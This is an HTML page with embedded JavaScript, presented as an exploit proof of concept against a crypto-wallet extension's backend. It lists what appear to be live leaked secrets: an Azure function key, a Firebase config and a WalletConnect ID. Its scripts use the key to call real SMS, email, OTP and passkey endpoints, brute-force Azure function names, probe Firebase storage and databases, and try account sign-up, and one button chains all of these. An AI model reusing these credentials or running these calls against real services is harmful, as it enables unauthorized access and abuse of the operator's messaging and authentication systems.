<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üö® CRITICAL: Exposed Constants Exploit POC</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        .header .subtitle {
            font-size: 1.2em;
            opacity: 0.95;
        }
        .critical-banner {
            background: #ff1744;
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 1.3em;
            font-weight: bold;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
        .content {
            padding: 30px;
        }
        .section {
            margin-bottom: 30px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            overflow: hidden;
        }
        .section-header {
            background: #f5f5f5;
            padding: 15px 20px;
            font-size: 1.3em;
            font-weight: bold;
            border-bottom: 2px solid #e0e0e0;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .section-content {
            padding: 20px;
        }
        .exposed-data {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            word-break: break-all;
        }
        .exposed-data.critical {
            background: #f8d7da;
            border-color: #dc3545;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            margin: 5px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.2);
        }
        button.danger {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        }
        button.success {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
        }
        .result {
            background: #f8f9fa;
            border-left: 4px solid #007bff;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 500px;
            overflow-y: auto;
            font-size: 0.9em;
        }
        .result.success {
            border-left-color: #28a745;
            background: #d4edda;
        }
        .result.error {
            border-left-color: #dc3545;
            background: #f8d7da;
        }
        .result.warning {
            border-left-color: #ffc107;
            background: #fff3cd;
        }
        .result.info {
            border-left-color: #17a2b8;
            background: #d1ecf1;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        .card {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 8px;
            padding: 15px;
        }
        .card h3 {
            color: #495057;
            margin-bottom: 10px;
            font-size: 1.1em;
        }
        .badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            font-weight: bold;
            margin-left: 10px;
        }
        .badge.critical {
            background: #dc3545;
            color: white;
        }
        .badge.high {
            background: #fd7e14;
            color: white;
        }
        .badge.medium {
            background: #ffc107;
            color: #000;
        }
        code {
            background: #e9ecef;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        .stat-card .number {
            font-size: 2.5em;
            font-weight: bold;
        }
        .stat-card .label {
            font-size: 0.9em;
            opacity: 0.9;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üö® CRITICAL SECURITY VULNERABILITY</h1>
            <div class="subtitle">Exposed Constants & API Keys Exploit POC</div>
        </div>
        
        <div class="critical-banner">
            ‚ö†Ô∏è ALL API KEYS AND SECRETS ARE EXPOSED CLIENT-SIDE ‚ö†Ô∏è
        </div>

        <div class="content">
            <!-- Exposed Constants Section -->
            <div class="section">
                <div class="section-header">
                    üîë Exposed Constants & Secrets
                </div>
                <div class="section-content">
                    <div class="exposed-data critical">
                        <strong>üö® CRITICAL: Gateway Function Key</strong><br>
                        <code>23o7dHkKdIMtjnft5q/J4mqpdBqqOOuajepmYqY0eAi9TaqQYsVSBA==</code>
                        <br><br>
                        <strong>Impact:</strong> This key can be used to make unauthorized API calls to Azure Functions
                    </div>

                    <div class="exposed-data">
                        <strong>API Endpoints Exposed:</strong><br>
                        ‚Ä¢ SMS Sender: <code>https://verified.azurewebsites.net/api/smssender</code><br>
                        ‚Ä¢ Email Sender: <code>https://verified.azurewebsites.net/api/emailsender</code><br>
                        ‚Ä¢ OTP Sender: <code>https://verified.azurewebsites.net/api/otpsender</code><br>
                        ‚Ä¢ Passkey Endpoint: <code>https://wallet.verified.network/get-passkey</code>
                    </div>

                    <div class="exposed-data">
                        <strong>Firebase Configuration:</strong><br>
                        ‚Ä¢ API Key: <code>AIzaSyC9NftjURlBho082sU7jzkLfI25ChqOUrk</code><br>
                        ‚Ä¢ Project ID: <code>verified-custody</code><br>
                        ‚Ä¢ VAPID Key: <code>BNkRzfJrlIYAtG5sKnpmi3uqEP3mJBKA_CGGk8tzkDbOF--n4-TpMO4n4m_X229yEfa8CLtCZ5oT65whfbcCNfc</code>
                    </div>

                    <div class="exposed-data">
                        <strong>WalletConnect Project ID:</strong><br>
                        <code>90b0e2ff886ba98147f2780659cf12a6</code>
                    </div>

                    <button onclick="extractConstants()" class="success">Extract from Extension</button>
                    <div id="extract-result"></div>
                </div>
            </div>

            <!-- API Exploitation Tests -->
            <div class="section">
                <div class="section-header">
                    üåê API Endpoint Exploitation Tests
                </div>
                <div class="section-content">
                    <div class="grid">
                        <div class="card">
                            <h3>SMS Sender API <span class="badge critical">CRITICAL</span></h3>
                            <p>Test unauthorized SMS sending using exposed endpoint</p>
                            <button onclick="testSMSSender()" class="danger">Test SMS Endpoint</button>
                        </div>
                        <div class="card">
                            <h3>Email Sender API <span class="badge critical">CRITICAL</span></h3>
                            <p>Test unauthorized email sending</p>
                            <button onclick="testEmailSender()" class="danger">Test Email Endpoint</button>
                        </div>
                        <div class="card">
                            <h3>OTP Sender API <span class="badge critical">CRITICAL</span></h3>
                            <p>Test OTP generation/verification bypass</p>
                            <button onclick="testOTPSender()" class="danger">Test OTP Endpoint</button>
                        </div>
                        <div class="card">
                            <h3>Passkey Endpoint <span class="badge high">HIGH</span></h3>
                            <p>Test passkey retrieval/creation</p>
                            <button onclick="testPasskeyEndpoint()" class="danger">Test Passkey</button>
                        </div>
                    </div>
                    <div id="api-results"></div>
                </div>
            </div>

            <!-- Gateway Function Key Exploitation -->
            <div class="section">
                <div class="section-header">
                    üîê Gateway Function Key Exploitation
                </div>
                <div class="section-content">
                    <p><strong>Critical:</strong> The gateway function key can be used to authenticate requests to Azure Functions.</p>
                    <button onclick="testGatewayKey()" class="danger">Test Gateway Key</button>
                    <button onclick="enumerateAzureFunctions()" class="danger">Enumerate Azure Functions</button>
                    <div id="gateway-results"></div>
                </div>
            </div>

            <!-- Firebase Exploitation -->
            <div class="section">
                <div class="section-header">
                    üî• Firebase Configuration Exploitation
                </div>
                <div class="section-content">
                    <p><strong>Risk:</strong> Exposed Firebase config can be used to access Firebase services.</p>
                    <button onclick="testFirebaseAccess()" class="danger">Test Firebase Access</button>
                    <button onclick="testFirebaseStorage()" class="danger">Test Firebase Storage</button>
                    <button onclick="testFirebaseAuth()" class="danger">Test Firebase Auth</button>
                    <div id="firebase-results"></div>
                </div>
            </div>

            <!-- Comprehensive Exploit -->
            <div class="section">
                <div class="section-header">
                    üí£ Comprehensive Exploit Test
                </div>
                <div class="section-content">
                    <p><strong>Warning:</strong> This will attempt all exploitation vectors simultaneously.</p>
                    <button onclick="runFullExploit()" class="danger" style="font-size: 18px; padding: 15px 30px;">üö® RUN FULL EXPLOIT üö®</button>
                    <div id="full-exploit-results"></div>
                </div>
            </div>

            <!-- Statistics -->
            <div class="stats" id="stats">
                <div class="stat-card">
                    <div class="number" id="stat-exposed">8</div>
                    <div class="label">Exposed Secrets</div>
                </div>
                <div class="stat-card">
                    <div class="number" id="stat-tested">0</div>
                    <div class="label">Tests Run</div>
                </div>
                <div class="stat-card">
                    <div class="number" id="stat-vulnerable">0</div>
                    <div class="label">Vulnerable Endpoints</div>
                </div>
                <div class="stat-card">
                    <div class="number" id="stat-critical">5</div>
                    <div class="label">Critical Issues</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Exposed constants from constants.ts
        const EXPOSED_CONSTANTS = {
            gatewayFunctionKey: "23o7dHkKdIMtjnft5q/J4mqpdBqqOOuajepmYqY0eAi9TaqQYsVSBA==",
            smsSenderUrl: "https://verified.azurewebsites.net/api/smssender",
            emailSenderUrl: "https://verified.azurewebsites.net/api/emailsender",
            verifiedOtpEndpoint: "https://verified.azurewebsites.net/api/otpsender",
            getPasskeyEndpoint: "https://wallet.verified.network/get-passkey",
            firebaseConfig: {
                apiKey: "AIzaSyC9NftjURlBho082sU7jzkLfI25ChqOUrk",
                authDomain: "verified-custody.firebaseapp.com",
                projectId: "verified-custody",
                storageBucket: "verified-custody.firebasestorage.app",
                messagingSenderId: "575278027010",
                appId: "1:575278027010:web:efde7726d858a8b9ff721b",
                measurementId: "G-ZXVZTFJ5PN"
            },
            firebaseVapid: "BNkRzfJrlIYAtG5sKnpmi3uqEP3mJBKA_CGGk8tzkDbOF--n4-TpMO4n4m_X229yEfa8CLtCZ5oT65whfbcCNfc",
            walletConnectProjectId: "90b0e2ff886ba98147f2780659cf12a6"
        };

        let testCount = 0;
        let vulnerableCount = 0;

        function updateStats() {
            document.getElementById('stat-tested').textContent = testCount;
            document.getElementById('stat-vulnerable').textContent = vulnerableCount;
        }

        function logResult(containerId, message, type = 'info') {
            const container = document.getElementById(containerId);
            const resultDiv = document.createElement('div');
            resultDiv.className = `result ${type}`;
            resultDiv.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            container.appendChild(resultDiv);
            container.scrollTop = container.scrollHeight;
            testCount++;
            updateStats();
        }

        // Extract constants from extension
        async function extractConstants() {
            const resultDiv = document.getElementById('extract-result');
            resultDiv.innerHTML = '<div class="result info">Extracting constants from extension...</div>';

            try {
                // Try to access extension's constants
                const scripts = Array.from(document.scripts);
                let found = false;

                for (const script of scripts) {
                    if (script.src && script.src.includes('content.js')) {
                        logResult('extract-result', 'Found content.js script', 'warning');
                        found = true;
                    }
                }

                // Check if constants are in global scope
                if (typeof window.gatewayFunctionKey !== 'undefined') {
                    logResult('extract-result', `Found gatewayFunctionKey: ${window.gatewayFunctionKey}`, 'error');
                }

                logResult('extract-result', 'Constants are embedded in compiled JavaScript bundle', 'error');
                logResult('extract-result', 'All constants are accessible via browser DevTools', 'error');
                logResult('extract-result', JSON.stringify(EXPOSED_CONSTANTS, null, 2), 'error');
            } catch (error) {
                logResult('extract-result', `Error: ${error.message}`, 'error');
            }
        }

        // Test SMS Sender API
        async function testSMSSender() {
            logResult('api-results', 'Testing SMS Sender API...', 'info');
            
            try {
                const response = await fetch(EXPOSED_CONSTANTS.smsSenderUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'x-functions-key': EXPOSED_CONSTANTS.gatewayFunctionKey
                    },
                    body: JSON.stringify({
                        phoneNumber: '+1234567890', // Test number
                        message: 'Test SMS from exploit POC'
                    })
                });

                const data = await response.text();
                
                if (response.ok) {
                    logResult('api-results', `üö® CRITICAL: SMS API accessible! Response: ${data}`, 'error');
                    vulnerableCount++;
                } else {
                    logResult('api-results', `SMS API returned ${response.status}: ${data}`, response.status === 401 ? 'success' : 'warning');
                }
            } catch (error) {
                logResult('api-results', `SMS API Error: ${error.message}`, 'warning');
            }
            updateStats();
        }

        // Test Email Sender API
        async function testEmailSender() {
            logResult('api-results', 'Testing Email Sender API...', 'info');
            
            try {
                const response = await fetch(EXPOSED_CONSTANTS.emailSenderUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'x-functions-key': EXPOSED_CONSTANTS.gatewayFunctionKey
                    },
                    body: JSON.stringify({
                        to: 'test@example.com',
                        subject: 'Test Email from Exploit POC',
                        body: 'This is a test email sent using exposed API key'
                    })
                });

                const data = await response.text();
                
                if (response.ok) {
                    logResult('api-results', `üö® CRITICAL: Email API accessible! Response: ${data}`, 'error');
                    vulnerableCount++;
                } else {
                    logResult('api-results', `Email API returned ${response.status}: ${data}`, response.status === 401 ? 'success' : 'warning');
                }
            } catch (error) {
                logResult('api-results', `Email API Error: ${error.message}`, 'warning');
            }
            updateStats();
        }

        // Test OTP Sender API
        async function testOTPSender() {
            logResult('api-results', 'Testing OTP Sender API...', 'info');
            
            try {
                const response = await fetch(EXPOSED_CONSTANTS.verifiedOtpEndpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'x-functions-key': EXPOSED_CONSTANTS.gatewayFunctionKey
                    },
                    body: JSON.stringify({
                        phoneNumber: '+1234567890',
                        email: 'test@example.com'
                    })
                });

                const data = await response.text();
                
                if (response.ok) {
                    logResult('api-results', `üö® CRITICAL: OTP API accessible! Response: ${data}`, 'error');
                    vulnerableCount++;
                } else {
                    logResult('api-results', `OTP API returned ${response.status}: ${data}`, response.status === 401 ? 'success' : 'warning');
                }
            } catch (error) {
                logResult('api-results', `OTP API Error: ${error.message}`, 'warning');
            }
            updateStats();
        }

        // Test Passkey Endpoint
        async function testPasskeyEndpoint() {
            logResult('api-results', 'Testing Passkey Endpoint...', 'info');
            
            try {
                const response = await fetch(EXPOSED_CONSTANTS.getPasskeyEndpoint, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                const data = await response.text();
                
                if (response.ok) {
                    logResult('api-results', `üö® CRITICAL: Passkey endpoint accessible! Response: ${data}`, 'error');
                    vulnerableCount++;
                } else {
                    logResult('api-results', `Passkey endpoint returned ${response.status}: ${data}`, 'warning');
                }
            } catch (error) {
                logResult('api-results', `Passkey Error: ${error.message}`, 'warning');
            }
            updateStats();
        }

        // Test Gateway Function Key
        async function testGatewayKey() {
            logResult('gateway-results', 'Testing Gateway Function Key...', 'info');
            
            // Test with different Azure Function endpoints
            const endpoints = [
                EXPOSED_CONSTANTS.smsSenderUrl,
                EXPOSED_CONSTANTS.emailSenderUrl,
                EXPOSED_CONSTANTS.verifiedOtpEndpoint
            ];

            for (const endpoint of endpoints) {
                try {
                    const response = await fetch(endpoint, {
                        method: 'GET',
                        headers: {
                            'x-functions-key': EXPOSED_CONSTANTS.gatewayFunctionKey
                        }
                    });

                    logResult('gateway-results', 
                        `${endpoint}: ${response.status} ${response.statusText}`, 
                        response.status === 200 ? 'error' : response.status === 401 ? 'success' : 'warning'
                    );

                    if (response.status === 200) {
                        vulnerableCount++;
                    }
                } catch (error) {
                    logResult('gateway-results', `${endpoint}: Error - ${error.message}`, 'warning');
                }
            }
            updateStats();
        }

        // Enumerate Azure Functions
        async function enumerateAzureFunctions() {
            logResult('gateway-results', 'Enumerating Azure Functions...', 'info');
            
            const baseUrl = 'https://verified.azurewebsites.net/api';
            const commonFunctions = [
                'smssender', 'emailsender', 'otpsender',
                'user', 'wallet', 'transaction', 'recovery',
                'auth', 'verify', 'validate', 'send', 'get'
            ];

            for (const func of commonFunctions) {
                try {
                    const response = await fetch(`${baseUrl}/${func}`, {
                        method: 'GET',
                        headers: {
                            'x-functions-key': EXPOSED_CONSTANTS.gatewayFunctionKey
                        }
                    });

                    if (response.status !== 404) {
                        logResult('gateway-results', 
                            `üö® Found function: /api/${func} (${response.status})`, 
                            response.status === 200 ? 'error' : 'warning'
                        );
                        if (response.status === 200) vulnerableCount++;
                    }
                } catch (error) {
                    // Silently fail for 404s
                }
            }
            updateStats();
        }

        // Test Firebase Access
        async function testFirebaseAccess() {
            logResult('firebase-results', 'Testing Firebase Access...', 'info');
            
            try {
                // Test Firebase API access
                const firebaseUrl = `https://${EXPOSED_CONSTANTS.firebaseConfig.projectId}.firebaseio.com/.json`;
                const response = await fetch(firebaseUrl, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                const data = await response.text();
                logResult('firebase-results', 
                    `Firebase Database: ${response.status} - ${data.substring(0, 200)}`, 
                    response.status === 200 ? 'error' : 'warning'
                );

                if (response.status === 200) {
                    vulnerableCount++;
                }
            } catch (error) {
                logResult('firebase-results', `Firebase Error: ${error.message}`, 'warning');
            }
            updateStats();
        }

        // Test Firebase Storage
        async function testFirebaseStorage() {
            logResult('firebase-results', 'Testing Firebase Storage...', 'info');
            
            try {
                const storageUrl = `https://firebasestorage.googleapis.com/v0/b/${EXPOSED_CONSTANTS.firebaseConfig.storageBucket}/o`;
                const response = await fetch(storageUrl, {
                    method: 'GET'
                });

                logResult('firebase-results', 
                    `Firebase Storage: ${response.status}`, 
                    response.status === 200 ? 'error' : 'warning'
                );

                if (response.status === 200) {
                    vulnerableCount++;
                }
            } catch (error) {
                logResult('firebase-results', `Storage Error: ${error.message}`, 'warning');
            }
            updateStats();
        }

        // Test Firebase Auth
        async function testFirebaseAuth() {
            logResult('firebase-results', 'Testing Firebase Auth...', 'info');
            
            try {
                // Firebase Auth API endpoint
                const authUrl = `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${EXPOSED_CONSTANTS.firebaseConfig.apiKey}`;
                const response = await fetch(authUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: 'test@example.com',
                        password: 'test123456',
                        returnSecureToken: true
                    })
                });

                const data = await response.json();
                logResult('firebase-results', 
                    `Firebase Auth: ${response.status} - ${JSON.stringify(data).substring(0, 200)}`, 
                    response.status === 200 ? 'error' : 'warning'
                );

                if (response.status === 200) {
                    vulnerableCount++;
                }
            } catch (error) {
                logResult('firebase-results', `Auth Error: ${error.message}`, 'warning');
            }
            updateStats();
        }

        // Run Full Exploit
        async function runFullExploit() {
            const resultDiv = document.getElementById('full-exploit-results');
            resultDiv.innerHTML = '<div class="result warning">üö® Running comprehensive exploit test...</div>';

            logResult('full-exploit-results', '=== FULL EXPLOIT TEST STARTED ===', 'error');
            logResult('full-exploit-results', 'Testing all exposed endpoints and keys...', 'error');

            // Run all tests
            await testSMSSender();
            await testEmailSender();
            await testOTPSender();
            await testPasskeyEndpoint();
            await testGatewayKey();
            await enumerateAzureFunctions();
            await testFirebaseAccess();
            await testFirebaseStorage();
            await testFirebaseAuth();

            logResult('full-exploit-results', '=== EXPLOIT TEST COMPLETE ===', 'error');
            logResult('full-exploit-results', `Total tests run: ${testCount}`, 'info');
            logResult('full-exploit-results', `Vulnerable endpoints found: ${vulnerableCount}`, vulnerableCount > 0 ? 'error' : 'success');
            
            if (vulnerableCount > 0) {
                logResult('full-exploit-results', 'üö® CRITICAL: Vulnerable endpoints detected!', 'error');
                logResult('full-exploit-results', 'Immediate remediation required!', 'error');
            }
        }

        // Initialize
        window.addEventListener('load', () => {
            console.log('[EXPLOIT POC] Loaded - Exposed Constants:', EXPOSED_CONSTANTS);
            logResult('api-results', 'Exploit POC initialized. All constants are exposed client-side.', 'error');
        });
    </script>
</body>
</html>

